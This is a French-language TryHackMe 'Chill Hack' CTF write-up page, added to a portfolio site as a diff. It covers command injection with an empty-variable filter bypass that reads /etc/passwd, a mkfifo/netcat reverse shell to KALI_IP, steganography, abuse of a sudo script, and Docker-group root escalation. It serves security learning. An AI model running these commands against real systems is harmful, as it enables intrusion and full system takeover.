@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Chill Hack — TryHackMe Writeup | Alex171</title>
+    <meta name="description"
+        content="Writeup Chill Hack TryHackMe — Command Injection, bypass filtre bash, stéganographie, Docker privesc." />
+    <link rel="stylesheet" href="../css/style.css" />
+    <link rel="stylesheet" href="../css/animations.css" />
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>" />
+</head>
+
+<body>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="grid-bg"></div>
+    <nav class="navbar">
+        <a class="nav-logo" href="../index.html">&gt;_<span> alex171</span></a>
+        <div class="nav-links">
+            <a href="../index.html">Accueil</a><a href="../about.html">À propos</a>
+            <a href="../writeups.html" class="active">Writeups</a><a href="../certifications.html">Certifications</a>
+            <a href="../projects.html">Projets</a><a href="../resources.html">Ressources</a>
+        </div>
+        <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+    </nav>
+    <div class="mobile-menu" id="mobile-menu">
+        <a href="../index.html">Accueil</a><a href="../writeups.html">Writeups</a>
+        <a href="../certifications.html">Certifications</a><a href="../resources.html">Ressources</a>
+    </div>
+
+    <main>
+        <section class="section">
+            <div class="container">
+                <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"
+                    class="fade-in">
+                    <a href="../index.html" style="color:var(--text-muted);">~</a> / <a href="../writeups.html"
+                        style="color:var(--text-muted);">writeups</a> / <span
+                        style="color:var(--green);">chill-hack</span>
+                </div>
+                <div class="writeup-layout">
+                    <article class="writeup-content fade-in">
+                        <div style="margin-bottom:2rem;">
+                            <div
+                                style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
+                                <span class="writeup-platform">TryHackMe</span><span class="diff diff-easy">Easy</span>
+                                <span style="font-family:var(--font-mono);font-size:0.72rem;color:var(--text-muted);">02
+                                    Mar 2026</span>
+                            </div>
+                            <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">
+                                Chill Hack</h1>
+                            <div class="writeup-meta">
+                                <span class="tag">FTP</span><span class="tag">Command Injection</span><span
+                                    class="tag">Bash Bypass</span>
+                                <span class="tag">Stéganographie</span><span class="tag">Docker</span>
+                            </div>
+                            <p style="color:var(--text-secondary);line-height:1.8;font-size:0.95rem;">
+                                Exploit d'une command injection web avec contournement de filtre bash via variable vide.
+                                Stéganographie pour obtenir un mot de passe ssh. Escalade via script sudo puis Docker.
+                            </p>
+                        </div>
+
+                        <h2 id="recon">Reconnaissance — Nmap</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">nmap</span> -sC -sV lab.thm</pre>
+                        </div>
+                        <ul>
+                            <li><strong>21/tcp</strong> — FTP (accès anonyme)</li>
+                            <li><strong>22/tcp</strong> — SSH</li>
+                            <li><strong>80/tcp</strong> — Apache</li>
+                        </ul>
+
+                        <h2 id="ftp">Enumération FTP</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">ftp</span> lab.thm
+<span class="hl-comment"># Connexion anonyme</span>
+ftp&gt; get note.txt</pre>
+                        </div>
+                        <p>Le fichier révèle le nom d'un utilisateur : <strong>Anurodh</strong>.</p>
+
+                        <h2 id="web">Enumération Web</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">gobuster</span> dir -u http://lab.thm -w common.txt</pre>
+                        </div>
+                        <p>Découverte de <code>/secret</code> : une page avec un champ de commande OS filtré.</p>
+
+                        <h2 id="injection">Command Injection — Bypass filtre</h2>
+                        <p>Le filtre bloque des mots comme <code>cat</code>, <code>ls</code>, etc. On le contourne avec
+                            une variable vide en bash :</p>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>Bypass bash via variable vide</span><button
+                                    class="copy-btn">Copier</button></div>
+                            <pre><span class="hl-comment"># Idée : $var_inexistante = "" donc c""at = cat</span>
+c$u at /etc/passwd     <span class="hl-comment"># $u = "" → cat</span>
+l$u s /home            <span class="hl-comment"># list users</span></pre>
+                        </div>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>Reverse Shell</span><button
+                                    class="copy-btn">Copier</button></div>
+                            <pre><span class="hl-comment"># Listener sur Kali :</span>
+<span class="hl-bash">nc</span> -lvnp 9001
+
+<span class="hl-comment"># Payload injecté (encodé si besoin) :</span>
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&amp;1 | nc KALI_IP 9001 >/tmp/f</pre>
+                        </div>
+                        <p>Shell obtenu en tant que <code>www-data</code>. Stabilisation via python3 pty.</p>
+
+                        <h2 id="steganography">Stéganographie</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">steghide</span> extract -sf /home/apaar/local.txt</pre>
+                        </div>
+                        <p>Un fichier image dans <code>/home/apaar</code> cache un fichier avec les credentials SSH de
+                            <strong>Apaar</strong>.</p>
+
+                        <h2 id="apaar">Escalade vers Apaar</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">sudo</span> -l   <span class="hl-comment"># En tant que www-data</span>
+<span class="hl-out">(apaar : NOPASSWD) /home/apaar/.helpline.sh</span></pre>
+                        </div>
+                        <p>On appelle le script en injectant un <code>/bin/bash</code> dans l'input attendu :</p>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">sudo</span> -u apaar /home/apaar/.helpline.sh
+<span class="hl-out">Message : /bin/bash -i</span></pre>
+                        </div>
+                        <div class="flag-box">User flag : dans <code>/home/apaar/local.txt</code></div>
+
+                        <h2 id="docker">Escalade Root — Docker</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">id</span>
+<span class="hl-out">groups: apaar docker</span>
+
+<span class="hl-bash">docker</span> run -v /:/mnt --rm -it alpine chroot /mnt sh</pre>
+                        </div>
+                        <p>L'appartenance au groupe <code>docker</code> permet de monter le système de fichiers root
+                            dans un container.</p>
+                        <div class="flag-box">Root flag : <code>/root/proof.txt</code></div>
+
+                        <h2 id="lessons">Leçons apprises</h2>
+                        <ul>
+                            <li>Le bypass filtre via variable vide bash est une technique classique à connaître</li>
+                            <li>Steghide = vérifier toutes les images trouvées en CTF</li>
+                            <li>Le groupe Docker = root indirect. Ne jamais y ajouter des utilisateurs non-root</li>
+                            <li>Les scripts sudo NOPASSWD doivent être examinés minutieusement</li>
+                        </ul>
+
+                        <div
+                            style="margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
+                            <a href="../writeups.html" class="btn btn-outline">← Tous les writeups</a>
+                            <a href="blog.html" class="btn btn-outline">Suivant : Blog →</a>
+                        </div>
+                    </article>
+
+                    <aside class="writeup-sidebar">
+                        <div class="sidebar-title">Table des matières</div>
+                        <div class="toc-list">
+                            <div class="toc-item" data-target="recon">Reconnaissance</div>
+                            <div class="toc-item" data-target="ftp">FTP</div>
+                            <div class="toc-item" data-target="web">Énumération Web</div>
+                            <div class="toc-item" data-target="injection">Command Injection</div>
+                            <div class="toc-item" data-target="steganography">Stéganographie</div>
+                            <div class="toc-item" data-target="apaar">Escalade Apaar</div>
+                            <div class="toc-item" data-target="docker">Docker Root</div>
+                            <div class="toc-item" data-target="lessons">Leçons apprises</div>
+                        </div>
+                        <hr style="border-color:var(--border);margin:1rem 0;" />
+                        <div
+                            style="display:flex;flex-direction:column;gap:0.4rem;font-size:0.78rem;font-family:var(--font-mono);">
+                            <div><span style="color:var(--text-muted);">Plateforme :</span> <span
+                                    style="color:var(--green);">TryHackMe</span></div>
+                            <div><span style="color:var(--text-muted);">Difficulté :</span> <span
+                                    style="color:#4ade80;">Easy</span></div>
+                            <div><span style="color:var(--text-muted);">Date :</span> <span
+                                    style="color:var(--text-secondary);">02 Mar 2026</span></div>
+                        </div>
+                    </aside>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-inner">
+                <div class="footer-name">&gt;_ alex171-studo</div>
+                <div class="footer-links"><a href="../writeups.html">Writeups</a><a href="../index.html">Accueil</a>
+                </div>
+                <div class="footer-copy">© 2026 Alex171-studo</div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="interactive-terminal" class="terminal-window">
+        <div class="terminal-titlebar">
+            <div class="terminal-dot dot-red"></div>
+            <div class="terminal-dot dot-yellow"></div>
+            <div class="terminal-dot dot-green"></div>
+            <span class="terminal-title">Terminal interactif</span>
+            <button id="term-close"
+                style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
+        </div>
+        <div class="term-interactive-body" id="term-output"></div>
+        <div class="term-input-line">
+            <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;">alex@portfolio:~$</span>
+            <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off"
+                spellcheck="false" />
+        </div>
+    </div>
+    <button class="term-toggle-btn" id="term-toggle">&gt;_</button>
+    <script src="../js/main.js"></script>
+    <script src="../js/terminal.js"></script>
+</body>
+
+</html>
